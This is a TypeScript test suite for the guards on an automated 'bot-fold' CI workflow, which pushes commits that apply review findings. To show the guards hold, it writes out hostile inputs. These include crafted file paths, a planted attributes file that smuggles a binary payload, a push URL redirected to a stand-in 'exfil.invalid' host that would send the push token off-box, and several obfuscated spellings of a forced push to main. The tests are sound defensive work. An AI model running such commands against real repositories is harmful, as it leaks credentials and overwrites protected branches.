    expect(nonAscii.status, nonAscii.out).toBe(1);
    // `core.quotePath=false` covers bytes >= 0x80 and stops there. A path holding a control
    // byte, a `\"` or a `\\` is still C-quoted, and the leading quote defeats all three
    // anchored arms at once - which is why the staged list is read NUL-delimited instead.
    for (const hostile of ['.github/workflows/ev"il.yml', 'scripts/ev\\il.sh', 'scripts/ev\u0001il.sh']) {
      const quoted = runStagedGuards(src, [{ path: hostile }]);
      expect(quoted.status, `not blocked: ${JSON.stringify(hostile)} ${quoted.out}`).toBe(1);
    }
  });

  it('fails closed when the staged-path enumeration itself fails', () => {
    // `|| true` terminates a PIPELINE, so while the enumeration was piped into grep, a `git`
    // that exited non-zero produced an empty BLOCKED and the guard PASSED - a fail-open on the
    // check that decides whether a fold may push at all. The enumeration is a separate command
    // now, so `set -e` kills the step. Asserted by making that one command fail.
    const failing = src.replace(
      /^ {10}git -c core\.quotePath=false diff --cached --name-only -z > "\$STAGED_PATHS"$/m,
      '          (exit 128) > "$STAGED_PATHS"'
    );
    expect(failing, 'the enumeration anchor moved').not.toBe(src);
    const broken = runStagedGuards(failing, [{ path: '.github/workflows/ci.yml' }]);
    expect(broken.status, broken.out).not.toBe(0);
    expect(broken.out).not.toContain('GUARDS_PASSED');
    // The paired control: the same staged path, shipped bytes, is refused by the guard itself.
    expect(runStagedGuards(src, [{ path: '.github/workflows/ci.yml' }]).status).toBe(1);
  });

  it('ignores a planted git attributes file when deciding what is binary', () => {
    // `core.attributesFile` is a default path under $HOME with no config entry behind it, so
    // the step's GIT_CONFIG_* nulling misses it and only the per-invocation
    // `-c core.attributesFile=/dev/null` closes it. Asserted by planting the file, because
    // the flag is otherwise a string nothing reads - deleting it left the suite green.
    //
    // `* binary` reclassifies ordinary source as binary: without the flag the binary arm
    // refuses every fold, so the failure mode is a fold that can never apply anything.
    const refused = runStagedGuards(src, [{ path: 'apps/client/app/a.ts', lines: 3 }], { attributes: '* binary' });
    expect(refused.status, refused.out).toBe(0);
    expect(refused.out).toContain('GUARDS_PASSED');
    // And the other direction, which is the one that costs something: `* -diff` makes a real
    // binary countable, so the binary arm stops refusing it AND the 800-line bound scores it
    // by lines, which a payload with no newline in it passes at any size.
    const smuggled = runStagedGuards(src, [{ path: 'apps/client/public/logo.png', binary: true }], {
      attributes: '* -diff',
    });
    expect(smuggled.status, smuggled.out).toBe(1);
    expect(smuggled.out).toContain('apps/client/public/logo.png');
  });

  it('refuses a fixup past the diff-size bound', () => {
    // Same principle as the path guard, on volume: a fold applies review findings, so a
    // sprawling diff means something other than that happened. Run rather than matched -
    // appending `CHANGED=0` after the assignment leaves the whole bound spelled out and
    // makes it unreachable.
    const under = runStagedGuards(src, [{ path: 'apps/client/app/a.ts', lines: 800 }]);
    expect(under.status, under.out).toBe(0);
    expect(under.out).toContain('fold: 800 changed lines staged');

    const over = runStagedGuards(src, [{ path: 'apps/client/app/a.ts', lines: 801 }]);
    expect(over.status).toBe(1);
    expect(over.out).toContain('past the 800-line bound');
    expect(over.out).toContain('emit:blocked');
    expect(over.out).not.toContain('GUARDS_PASSED');

    // DELETED lines count too, and they are a separate term in the awk expression - an
    // add-only fixture leaves numstat's second column at 0 for every case, so dropping
    // that term entirely stays green. Deleting one tracked file is how a fold gets past
    // the bound without adding a line.
    const deletion = runStagedGuards(src, [{ path: 'apps/client/app/b.ts', lines: 801, deleted: true }]);
    expect(deletion.status, deletion.out).toBe(1);
    expect(deletion.out).toContain('past the 800-line bound');
  });

  it('puts on the remote exactly what the guards allowed, and nothing otherwise', () => {
    // END STATE, not spelling. Everything else about this step is either a pattern over its
    // text or an execution of the two bounds in the middle of it, which left the relation
    // between what it REPORTS and what it DOES unasserted - see `runPushStep` for the five
    // one-line edits and the one allowlisted-subcommand pair that live in exactly that gap.
    const edited = runPushStep(src, { edits: [{ path: 'src/a.ts', lines: 4 }], untracked: ['src/dropped.ts'] });
    expect(edited.status, edited.out).toBe(0);
    expect(edited.pushed).toEqual(['true']);
    expect(edited.remoteLog[0]).toBe('chore(bot-fold): apply review findings from the automated review');
    // The COMMIT's contents, not the index the guard read. This is the assertion a
    // working-tree write plus `commit -a` fails, and the one that makes `git add -u`'s
    // tracked-files-only bound behavioural: the dropped untracked file is not here.
    expect(edited.remoteChanged).toEqual(['src/a.ts']);

    const ciConfig = runPushStep(src, { edits: [{ path: '.github/workflows/ci.yml', lines: 4 }] });
    expect(ciConfig.status).toBe(1);
    expect(ciConfig.pushed).toEqual(['blocked']);
    expect(ciConfig.remoteLog).toEqual(['base']);

    const untouched = runPushStep(src, {});
    expect(untouched.status, untouched.out).toBe(0);
    expect(untouched.pushed).toEqual(['none']);
    expect(untouched.remoteLog).toEqual(['base']);

    const oversized = runPushStep(src, { edits: [{ path: 'src/a.ts', lines: 900 }] });
    expect(oversized.status).toBe(1);
    expect(oversized.pushed).toEqual(['blocked']);
    expect(oversized.remoteLog).toEqual(['base']);

    // The fail-closed contract as an OUTCOME. A failed push must leave a non-zero status, one
    // report of `false`, and a reason the failure reporter can print.
    const raced = runPushStep(src, { diverge: true, edits: [{ path: 'src/a.ts', lines: 4 }] });
    expect(raced.status).toBe(1);
    // EXACTLY one report. Moving the success `exit 0` into an `else`, or wrapping the body in a
    // subshell where `exit 0` leaves only the subshell, both let the classifier run as well and
    // show up here as two values rather than as a wrong one.
    expect(raced.pushed).toEqual(['false']);
    expect(raced.reason).toContain('the branch moved while the review ran');
    expect(raced.remoteLog).toEqual(['the author pushed while the review ran', 'base']);

    // The PR head is the only ref the step may put anything on, in any of these outcomes.
    // Every assertion above reads that one ref, so a push to a DIFFERENT one - which is what
    // `git push --force origin HEAD:main` is, however it is reached - landed on the remote
    // with nothing here looking at it. Bounding the refs bounds the class.
    for (const [label, outcome] of Object.entries({ edited, ciConfig, untouched, oversized, raced })) {
      expect(outcome.remoteRefs, label).toEqual([`refs/heads/${PUSH_HEAD_REF}`]);
    }

    // And the DESTINATION, which bounding the ref does not bound: `remoteRefs` reads the
    // scratch remote, so a body pointed at another host leaves it untouched and every
    // assertion above passes while the executed body ships PUSH_TOKEN off-box.
    //
    // This is a CONTROL ON THE HARNESS, not the bound. The bound on where a fold may push is the
    // by-value pin on `gitPushes` above - the destination URL is one of its argv elements - and
    // this assertion makes the harness refuse an unredirected remote rather than observe a
    // scratch repo the executed body never touched. Read it that way: deleting this line does not
    // reopen the destination, it only removes the fidelity check that would have caught the
    // harness lying. Fed a mutated `src` rather than injected into the workflow for the same
    // reason - the `gitPushes` pin catches that mutation first and would mask which assertion is
    // doing the work.
    const exfil = runPushStep(src.replace('@github.com/${REPO}.git', '@exfil.invalid/${REPO}.git'), {
      edits: [{ path: 'src/a.ts', lines: 4 }],
    });
    expect(exfil.status, exfil.out).not.toBe(0);
    expect(exfil.out).toContain('refusing a remote this harness does not redirect');
    expect(exfil.remoteLog).toEqual(['base']);
  });

  // `unquoteWord` is the normaliser every prefix loop and program sweep runs a shell word
  // through, so a word it under-strips is a bound that silently does not apply. Pinned directly
  // because the spellings matrix only instantiates the single-pair shape, while the two failures
  // that matter are in shapes it never produces: ADJACENT quotes, where the lookbehind form
  // CONSUMED the character before a quote and so could not match the second of two, and a
  // BACKSLASH outside single quotes, where the pair-preserving form kept the escape the shell
  // removes. `''env'' git push` and `\env git push` are each the same command as `env git push`,
  // and each of those forms left a stray character that makes SHELL_PREFIX miss the prefix -
  // putting the push outside every by-value bound keyed on the program.
  it('strips shell quoting the way the shell does, adjacent quotes and backslashes included', () => {
    const cases: Array<[string, string]> = [
      ['git', 'git'],
      ["'env'", 'env'],
      ['"command"', 'command'],
      ["''", ''],
      ['""', ''],
      ['\'ti\'"me"', 'time'],
      ["'a'''b'", 'ab'],
      // Outside quotes a backslash escapes the NEXT character, which the shell then runs: the
      // word `\'` is the word `'`, and `a\'b` is `a'b`.
      ["\\'", "'"],
      ["a\\'b", "a'b"],
      // The other direction, so the rule is not "delete every backslash": inside DOUBLE quotes
      // a backslash only escapes `"`, `$`, backtick and itself, so `"a\b"` keeps it.
      ['"a\\b"', 'a\\b'],
      // And outside quotes it does NOT survive the same way - the backslash goes and the
      // ordinary character stays, so `\a` is the word `a`. (The row above is the one where a
      // backslash is kept, and it is the double-quoted one.)
      ['\\a', 'a'],
    ];
    for (const [input, expected] of cases) {
      expect([input, unquoteWord(input)]).toEqual([input, expected]);
    }

    // Paired controls, one per form this helper has shipped or nearly shipped. Each names the
    // rows it gets wrong, so the assertion above is shown to hold those rows rather than to hold
    // that the helper was called. The first is the lookbehind form this file carried until the
    // adjacent-quote rewrite; the second is the pair-preserving form it carried BEFORE that.
    const diverges = (impl: (word: string) => string) =>
      cases.filter(([input, expected]) => impl(input) !== expected).map(([input]) => input);
    const lookbehind = (word: string) => word.replace(/(^|[^\\])['"]/g, (_match, before) => before);
    expect(diverges(lookbehind)).toEqual(["''", '""', '\'ti\'"me"', "'a'''b'", "\\'", "a\\'b", '\\a']);
    const pairKeeping = (word: string) => word.replace(/\\.|['"]/g, match => (match.length === 2 ? match : ''));
    expect(diverges(pairKeeping)).toEqual(["\\'", "a\\'b", '\\a']);
  });

  it('pushes non-force to the PR head ref, with a token the checkout never held', () => {
    // Swept over every `run:` body in the FILE, not over the `Push fold commit` step. The
    // invariant is "a fold cannot push anywhere but the PR head, and never with --force";
    // a step-scoped assertion makes that a property of one step NAME, and adding a second
    // step that reuses `steps.push_token.outputs.token` is both the obvious way to break
    // the invariant and invisible to it. Bodies rather than step text because the push
    // step's own comments quote `git push origin` while explaining why we do not use it,
    // and contain the word `--force` too.
    const commands = runBodies(src).join('\n');
    // The whole invocation, by value. Not `--force` and a `refs/heads/` literal read off the
    // text: `git -c http.version=HTTP/1.1 push --force origin HEAD:main` carries neither the
    // one-space `git push` a text matcher wants nor a `refs/heads/` refspec, and `HEAD:main`
    // names the default branch exactly as well as the long form does. Pinning the argv end to
    // end makes the destination, the transport URL, the absent `--force` and the absence of a
    // SECOND push one assertion, and each of those is a way to break the invariant.
    expect(gitPushes(src)).toEqual([
      [
        'git',
        'push',
        '--no-verify',
        'https://x-access-token:${PUSH_TOKEN}@github.com/${REPO}.git',
        'HEAD:refs/heads/${HEAD_REF}',
      ],
    ]);
    // The ref is the one the PR came from. The refspec alone is not enough: rebinding
    // HEAD_REF in the step env to `base.ref` (or to `github.ref_name`) leaves the text above
    // untouched and pushes the fold commit to the PR's BASE branch - i.e. to main. So the
    // binding is pinned too, in the step that holds the token.
    const pushStep = step(src, 'Push fold commit');
    expect(pushStep).toMatch(/^ {10}HEAD_REF: \$\{\{ github\.event\.pull_request\.head\.ref \}\}$/m);
    expect(pushStep).toMatch(/^ {10}PUSH_TOKEN: \$\{\{ steps\.push_token\.outputs\.token \}\}$/m);
    // And it is the only consumer of the token, for the same reason.
    expect(src.match(/steps\.push_token\.outputs\.token/g)).toHaveLength(1);
    // --no-verify on the push and on the commit, and --no-gpg-sign on the commit: with the
    // global and system config nulled these are belt to braces, and they are what stops a
    // `core.hooksPath` or `commit.gpgsign` reaching either invocation if that nulling is
    // ever dropped. Pinned because dropping a flag is a silent widening.
    expect(commands).toMatch(/git push --no-verify/);
    expect(commands).toMatch(/commit --no-verify --no-gpg-sign/);

    // The checkout must not leave a credential in .git/config for anything to reach. Scoped to
    // the step, plus a file-wide check so a second checkout cannot persist one either.
    expect(step(src, 'Checkout PR head')).toMatch(/^\s*persist-credentials: false$/m);
    expect(src).not.toMatch(/persist-credentials: true/);

    // POSITIVE CONTROL for the sweep, along the axis that defeated it: `name:` is OPTIONAL
    // on a step, so a second push can be written with the list-item dash on the `run:` line
    // itself. That shape was invisible to `runBodies` while the identical body under a
    // `name:` was caught, and prettier leaves it byte-identical - it has no key to invent.
    // Two axes, because this sweep has been blind along each of them in turn. STEP SHAPE:
    // `name:` is OPTIONAL, so a second push can be written with the list-item dash on the
    // `run:` line itself, and a block header may carry a comment or an indentation indicator -
    // each of those is a real step to a YAML parser, and prettier returns every one of them
    // byte-identical. COMMAND SPELLING: `git -c <key>=<value> push` is this job's own house
    // style, and two spaces or a line continuation between `git` and `push` are the same
    // command to the shell and a different string to a matcher. COMMAND PREFIX:
    // `sudo`/`env`/`command`/`time` and a `VAR=value` assignment all sit in front of the
    // program without being it, and quoting one changes nothing about what the shell runs -
    // `'env' git push` was green against every by-value bound in this file while the PROGRAMS
    // set, which normalized, still reported exactly `git`. Each entry below falsifies a
    // different half of that: without `sudo` in `SHELL_PREFIX` the bare form escapes, and
    // without `unquoteWord` in `commandProgram` the quoted form does. Note the deliberate
    // absence of a URL - a URL-bearing push trips `checkoutCodeReferences` instead, so a
    // mutation spelled that way reds a DIFFERENT assertion and proves nothing about this one.
    const spellings = [
      'git push --force "https://x-access-token:${PUSH_TOKEN}@github.com/${REPO}.git" HEAD:refs/heads/main',
      'git -c http.version=HTTP/1.1 push --force origin HEAD:main',
      'git  push --force origin HEAD:main',
      'git \\\n            push --force origin HEAD:main',
      'sudo git push --force origin HEAD:main',
      "'env' git push --force origin HEAD:main",
      '"command" git push --force origin HEAD:main',
      "GIT_TERMINAL_PROMPT=0 'time' git push --force origin HEAD:main",
    ];
    const shapes = [
      (body: string) => `      - name: Publish the fold\n        run: |\n          ${body}`,
      (body: string) => `      - run: |\n          ${body}`,
      (body: string) => `      - run: ${body}`,
      (body: string) => `      - name: Publish the fold\n        run: | # publish\n          ${body}`,
      (body: string) => `      - name: Publish the fold\n        run: |2-\n          ${body}`,
      (body: string) => `      - name: Publish the fold\n        run: |+ # publish\n          ${body}`,
    ];
    for (const spelling of spellings) {
      for (const shape of shapes) {
        const added = shape(spelling);
        const injected = src.replace(
          /^ {6}- name: Report skill-fetch failure$/m,
          `${added}\n      - name: Report skill-fetch failure`
        );
        expect(injected, 'the injection anchor moved').not.toBe(src);
        expect(gitPushes(injected).length, `a second push was not seen: ${added}`).toBeGreaterThan(1);
      }
    }
    // And the same for the staging pin, which had the same literal shape.
    for (const staging of ['git -c core.autocrlf=false add -- .', 'git  add -- .', 'git update-index --add -- .']) {
      const injected = src.replace(/^ {10}git add -u$/m, `          git add -u\n          ${staging}`);
      expect(injected, 'the injection anchor moved').not.toBe(src);
      expect(
        gitCommands(injected, /^(add|update-index|stage)$/).length,
        `a second staging invocation was not seen: ${staging}`
      ).toBeGreaterThan(1);
    }
  });

  it('gates every bot-review label site on bot-fold too', () => {
    // The class of bug this catches: a gate that still reads `== 'bot-review'` alone silently
    // skips its step on a fold run. `Remove re-review label` is the one that bites hardest -
    // an untwinned gate leaves the fold label attached, so the next label add is a no-op. It is
    // asserted by name rather than counted among the matches, so a rewrite of its condition
    // cannot drop it out of the denominator.
    expect(step(src, 'Remove re-review label')).toMatch(
      /if: .*github\.event\.label\.name == 'bot-review' \|\| github\.event\.label\.name == 'bot-fold'/
    );
    const sites = src.split('\n').filter(line => line.includes("github.event.label.name == 'bot-review'"));
    expect(sites.length).toBeGreaterThan(0);
    for (const site of sites) {
      expect(site).toContain('bot-fold');
    }
    // And the label removed is the one that fired, never a hardcoded name - carried
    // through env rather than spliced into the `run:` body, which is the shape of an
    // Actions script injection.
    expect(src).toMatch(/^\s*LABEL: \$\{\{ github\.event\.label\.name \}\}$/m);
    expect(src).toMatch(/--remove-label "\$LABEL"/);
    expect(src).not.toMatch(/--remove-label (bot-review|bot-fold)\b/);
  });

  it('never lets a fold run cancel the review run it arrives alongside', () => {
    // Deliberately not named "does not cancel a fold run in flight": `cancel-in-progress` is
    // evaluated on the INCOMING run and the group key carries no mode, so this line cannot
    // protect a fold run from being cancelled. The `!cancelled()` gates above do that.
    const block = src.match(/^concurrency:\n(?:(?: {2}.*)?\n)+/m)?.[0] ?? '';
    expect(block).toMatch(/^ {2}cancel-in-progress: \$\{\{ github\.event\.label\.name != 'bot-fold' \}\}$/m);
  });
});
